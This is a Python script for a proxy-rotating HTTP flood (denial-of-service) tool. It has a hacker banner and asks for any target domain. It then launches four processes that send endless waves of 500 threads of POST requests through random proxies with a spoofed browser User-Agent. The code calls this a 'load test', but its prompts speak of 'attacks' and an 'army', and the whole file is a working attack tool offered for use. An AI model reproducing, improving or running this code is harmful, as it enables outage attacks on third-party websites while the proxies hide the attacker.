import threading
import multiprocessing
import requests
import os
import random
from colorama import init, Fore, Style

init(autoreset=True)

def logo():
    print(Fore.RED + r'''
        __________________________________________________
        |     xx      xx        \\     ________     //   |   
        |      xx    xx          \\  /          \  //    |
        |       xx  xx            \\/   (@) (@)  \//     |
        |       xx xx  <==MAN==>   \|      ^     |/      |
        |       xx  xx               \_./||||\._/        |       
        |      xx    xx             //\ \||||/ /\\       | 
        |     xx      xx           //  \______/  \\      |
        |    xx        xx         //              \\     |
        |________________NEX-CODEX_______________________| 

        {style.BRIGHT}{Fore.RED} Reach me IG : {Fore.BLUE} xmanhacky{Fore.ORANGE}
        ''')

def load_proxies_from_file(file_path='working_proxies.txt'):
    try:
        with open(file_path, 'r') as file:
            proxies = file.read().splitlines()
            print(f"[SUCCESS] Loaded {len(proxies)} proxies from {file_path}")
            return proxies
    except FileNotFoundError:
        print(f"[ERROR] Proxy file {file_path} not found.")
        return []

def send_request(link, proxy):
    url = f"https://{link}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
        'Referer': f'https://{link}'
    }
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}",
    }
    try:
        response = requests.post(url, headers=headers, proxies=proxies, timeout=5)
        if response.status_code == 200:
            print(f"⟬☠️⟭> {Fore.GREEN}{Style.BRIGHT}Request to [{link}] via proxy [{proxy}] succeeded!")
        else:
            print(f"⟬☠️⟭> {Fore.YELLOW}Request to [{link}] via proxy [{proxy}] failed with status code: {response.status_code}\n")
    except requests.RequestException as e:
        print(f"⟬☠️⟭> {Fore.RED}Request to [{link}] via proxy [{proxy}] failed. Error: {e}")

def load_test(link, proxies, num_threads):
    while True:
        for _ in range(num_threads):
            proxy = random.choice(proxies)
            thread = threading.Thread(target=send_request, args=(link, proxy))
            thread.start()

def clear_screen():
    if os.name == 'nt':  # for Windows
        os.system('cls')
    else:  # for Unix-like (Linux/macOS)
        os.system('clear')

def main():
    clear_screen()
    logo()

    # Website input
    while True:
        link = input("⟬☠️⟭>>Enter the Website link\n [e.g example.com]:  ")
        if link.endswith((".com", ".in", ".net")):
            break
        else:
            clear_screen()
            logo()

    # Confirmation input
    while True:
        y = input("⟬☠️⟭>>You sure you wanna do this ? (y/n): ").strip().lower()
        if y in ("y", ""):
            break
        elif y == "n":
            return

    # Load proxies from the text file
    proxies = load_proxies_from_file('working_proxies.txt')
    if not proxies:
        return

    # Attack setup
    num_processes = 4  # Number of concurrent processes
    num_threads_per_process = 500  # Number of threads per process
    print(f"{Fore.CYAN}😁 Starting Stress Load <{num_processes}> attacks and <{num_threads_per_process}> army count each attack ...")

    processes = []
    for _ in range(num_processes):
        process = multiprocessing.Process(target=load_test, args=(link, proxies, num_threads_per_process))
        process.start()
        processes.append(process)

    for process in processes:
        process.join()

if __name__ == "__main__":
    main()
